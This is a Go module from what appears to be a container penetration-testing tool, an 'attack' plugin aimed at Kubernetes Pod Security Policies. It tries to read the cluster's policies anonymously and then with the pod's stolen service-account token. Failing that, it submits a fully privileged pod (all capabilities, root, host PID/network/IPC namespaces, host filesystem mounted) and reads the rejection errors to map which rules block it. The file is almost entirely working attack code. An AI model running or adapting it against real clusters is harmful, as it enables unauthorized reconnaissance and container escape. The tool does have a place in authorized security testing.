package attack

import (
	"fmt"
	"io/ioutil"
	"log"
	"regexp"
	"strings"

	"github.com/KPT/conf"
	"github.com/KPT/gadget/kubectl"
)

var pspApi = "/apis/policy/v1beta1/podsecuritypolicies"
var defaultPodApi = "/api/v1/namespaces/default/pods"
var pspRegexPat = "spec\\.([^:]+): Invalid value: ([^:]+):"

/*
PodData is from a pod yaml config for hit more pod security policy(https://kubernetes.io/docs/concepts/policy/pod-security-policy/) as below:

apiVersion: v1
kind: Pod
metadata:
  name: fuzz-psp
spec:
  securityContext:
    runAsUser: 1000
    runAsGroup: 3000
    supplementalGroups: [ 10001]
    fsGroup: 10001
    sysctls:
      - name: net.ipv4.ip_local_port_range
        value: "10000 61000"
      - name: net.ipv4.tcp_fin_timeout
        value: "30"
  hostPID: true
  hostIPC: true
  hostNetwork: true
  containers:
  - name: nearcontainer
    image: "alpine"
    securityContext:
      privileged: true
      runAsUser: 0
      capabilities:
        add:
        - CAP_CHOWN
        - CAP_DAC_OVERRIDE
        - CAP_DAC_READ_SEARCH
        - CAP_FOWNER
        - CAP_FSETID
        - CAP_KILL
        - CAP_SETGID
        - CAP_SETUID
        - CAP_SETPCAP
        - CAP_LINUX_IMMUTABLE
        - CAP_NET_BIND_SERVICE
        - CAP_NET_BROADCAST
        - CAP_NET_ADMIN
        - CAP_NET_RAW
        - CAP_IPC_LOCK
        - CAP_IPC_OWNER
        - CAP_SYS_MODULE
        - CAP_SYS_RAWIO
        - CAP_SYS_CHROOT
        - CAP_SYS_PTRACE
        - CAP_SYS_PACCT
        - CAP_SYS_ADMIN
        - CAP_SYS_BOOT
        - CAP_SYS_NICE
        - CAP_SYS_RESOURCE
        - CAP_SYS_TIME
        - CAP_SYS_TTY_CONFIG
        - CAP_MKNOD
        - CAP_LEASE
        - CAP_AUDIT_WRITE
        - CAP_AUDIT_CONTROL
        - CAP_SETFCAP
        - CAP_MAC_OVERRIDE
        - CAP_MAC_ADMIN
        - CAP_SYSLOG
        - CAP_WAKE_ALARM
        - CAP_BLOCK_SUSPEND
        - CAP_AUDIT_READ
        - CAP_PERFMON
        - CAP_BPF
        - CAP_CHECKPOINT_RESTORE
    command: ["/bin/sh", "-c", "sleep 1"]
    volumeMounts:
      - name: dev
        mountPath: /host/dev
      - name: etc
        mountPath: /host/etc
      - name: proc
        mountPath: /host/proc
      - name: sys
        mountPath: /host/sys
      - name: rootfs
        mountPath: /host_root
  volumes:
    - name: proc
      hostPath:
        path: /proc
    - name: etc
      hostPath:
        path: /etc
    - name: dev
      hostPath:
        path: /dev
    - name: sys
      hostPath:
        path: /sys
    - name: rootfs
      hostPath:
        path: /
*/

var podData = `{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "name": "fuzz-psp"
    },
    "spec": {
        "containers": [
            {
                "command": [
                    "/bin/sh",
                    "-c",
                    "sleep 1"
                ],
                "image": "alpine",
                "name": "nearcontainer",
                "securityContext": {
                    "capabilities": {
                        "add": [
                            "CAP_CHOWN",
                            "CAP_DAC_OVERRIDE",
                            "CAP_DAC_READ_SEARCH",
                            "CAP_FOWNER",
                            "CAP_FSETID",
                            "CAP_KILL",
                            "CAP_SETGID",
                            "CAP_SETUID",
                            "CAP_SETPCAP",
                            "CAP_LINUX_IMMUTABLE",
                            "CAP_NET_BIND_SERVICE",
                            "CAP_NET_BROADCAST",
                            "CAP_NET_ADMIN",
                            "CAP_NET_RAW",
                            "CAP_IPC_LOCK",
                            "CAP_IPC_OWNER",
                            "CAP_SYS_MODULE",
                            "CAP_SYS_RAWIO",
                            "CAP_SYS_CHROOT",
                            "CAP_SYS_PTRACE",
                            "CAP_SYS_PACCT",
                            "CAP_SYS_ADMIN",
                            "CAP_SYS_BOOT",
                            "CAP_SYS_NICE",
                            "CAP_SYS_RESOURCE",
                            "CAP_SYS_TIME",
                            "CAP_SYS_TTY_CONFIG",
                            "CAP_MKNOD",
                            "CAP_LEASE",
                            "CAP_AUDIT_WRITE",
                            "CAP_AUDIT_CONTROL",
                            "CAP_SETFCAP",
                            "CAP_MAC_OVERRIDE",
                            "CAP_MAC_ADMIN",
                            "CAP_SYSLOG",
                            "CAP_WAKE_ALARM",
                            "CAP_BLOCK_SUSPEND",
                            "CAP_AUDIT_READ",
                            "CAP_PERFMON",
                            "CAP_BPF",
                            "CAP_CHECKPOINT_RESTORE"
                        ]
                    },
                    "privileged": true,
                    "runAsUser": 0
                },
                "volumeMounts": [
                    {
                        "mountPath": "/host/dev",
                        "name": "dev"
                    },
                    {
                        "mountPath": "/host/etc",
                        "name": "etc"
                    },
                    {
                        "mountPath": "/host/proc",
                        "name": "proc"
                    },
                    {
                        "mountPath": "/host/sys",
                        "name": "sys"
                    },
                    {
                        "mountPath": "/host_root",
                        "name": "rootfs"
                    }
                ]
            }
        ],
        "hostIPC": true,
        "hostNetwork": true,
        "hostPID": true,
        "securityContext": {
            "fsGroup": 10001,
            "runAsGroup": 3000,
            "runAsUser": 1000,
            "supplementalGroups": [
                10001
            ],
            "sysctls": [
                {
                    "name": "net.ipv4.ip_local_port_range",
                    "value": "10000 61000"
                },
                {
                    "name": "net.ipv4.tcp_fin_timeout",
                    "value": "30"
                }
            ]
        },
        "volumes": [
            {
                "hostPath": {
                    "path": "/proc"
                },
                "name": "proc"
            },
            {
                "hostPath": {
                    "path": "/etc"
                },
                "name": "etc"
            },
            {
                "hostPath": {
                    "path": "/dev"
                },
                "name": "dev"
            },
            {
                "hostPath": {
                    "path": "/sys"
                },
                "name": "sys"
            },
            {
                "hostPath": {
                    "path": "/"
                },
                "name": "rootfs"
            }
        ]
    }
}`

// plugin interface
// type K8SPodSecurityPolicy struct{}

// func (p K8SPodSecurityPolicy) Desc() string {
// 	return "Dump K8S Pod Security Policies and try, usage: kpt attack getpsp [auto|<service-account-token-path>]"
// }

func dumpPSPBlockRule(serverAddr string, tokenPath string) {
	log.Println("requesting ", defaultPodApi)
	resp, err := kubectl.ServerAccountRequest(
		kubectl.K8sRequestOption{
			TokenPath: tokenPath,
			Server:    serverAddr,
			Api:       defaultPodApi,
			Method:    "post",
			PostData:  podData,
			Anonymous: false,
		})
	if err != nil {
		fmt.Println(err)
	}

	pat := regexp.MustCompile(pspRegexPat)
	matches := pat.FindAllStringSubmatch(resp, -1)

	if len(matches) == 0 {
		fmt.Println(resp)
		return
	}

	log.Println("K8S Pod Security Policies rule list:")
	for _, match := range matches {
		log.Printf("rule { %s: %s } is not allowed.", match[1], match[2])
	}
}

func dumpK8sPSP(serverAddr string, tokenPath string, anonymous bool) string {
	log.Println("requesting ", pspApi)
	resp, err := kubectl.ServerAccountRequest(
		kubectl.K8sRequestOption{
			TokenPath: tokenPath,
			Server:    serverAddr, // default
			Api:       pspApi,
			Method:    "get",
			PostData:  "",
			Anonymous: anonymous,
		})
	if err != nil {
		fmt.Println(err)
	}
	return resp
}

// // StringContains check string array contains a string
// func StringContains(s []string, e string) bool {
// 	// grabbed from https://stackoverflow.com/questions/10485743/contains-method-for-a-slice
// 	for _, a := range s {
// 		if a == e {
// 			return true
// 		}
// 	}
// 	return false
// }

func K8SPodSecurityPolicy(token string) bool {
	// args := cli.Args["<args>"].([]string)
	// if len(args) < 1 {
	// 	log.Println("invalid input args.")
	// 	log.Fatal("Dump K8S Pod Security Policies and try, usage: kpt attack getpsp [auto|<service-account-token-path>]")
	// }

	// get api-server connection conf in ENV
	log.Println("getting K8s api-server API addr.")
	addr, err := kubectl.ApiServerAddr()
	if err != nil {
		fmt.Println(err)
		return false
	}
	fmt.Println("\tFind K8s api-server in ENV:", addr)

	var resp string
	var outFile = "k8s_pod_security_policies.json"

	switch token {
	case "auto":
		log.Println("trying to dump K8s Pod Security Policies with user system:anonymous")
		resp = dumpK8sPSP(addr, "", true) // dump K8s Pod Security Policies with Anonymous
		if strings.Contains(resp, `"code":403`) {
			log.Println("failed, 403 Forbidden, api-server response:")
			fmt.Println(resp)

			log.Println("trying to dump K8s Pod Security Policies with local service-account:", conf.K8sSATokenDefaultPath)
			resp = dumpK8sPSP(addr, conf.K8sSATokenDefaultPath, false)

			// ./cdk run k8s-psp-dump auto force-fuzz
			// we can run fuzz anyway
			if !strings.Contains(resp, "selfLink") || strings.Contains(token, "force-fuzz") {
				log.Println("failed, api-server response:")
				fmt.Println(resp)

				dumpPSPBlockRule(addr, conf.K8sSATokenDefaultPath)
				return false
			}
		}

	default:
		log.Println("trying to dump K8s Pod Security Policies with local service-account:", token)
		resp = dumpK8sPSP(addr, token, false)

		if !strings.Contains(resp, "selfLink") {
			log.Println("failed, api-server response:")
			fmt.Println(resp)

			dumpPSPBlockRule(addr, token)
			return false
		}
	}

	log.Println("dump Pod Security Policies success, saved in: ", outFile)
	err = ioutil.WriteFile(outFile, []byte(resp), 0666)
	if err != nil {
		log.Println("failed to write file.", err)
		return false
	}

	return true
}

// func init() {
// 	exploit := K8SPodSecurityPolicy{}
// 	plugin.RegisterExploit("k8s-psp-dump", exploit)
// }
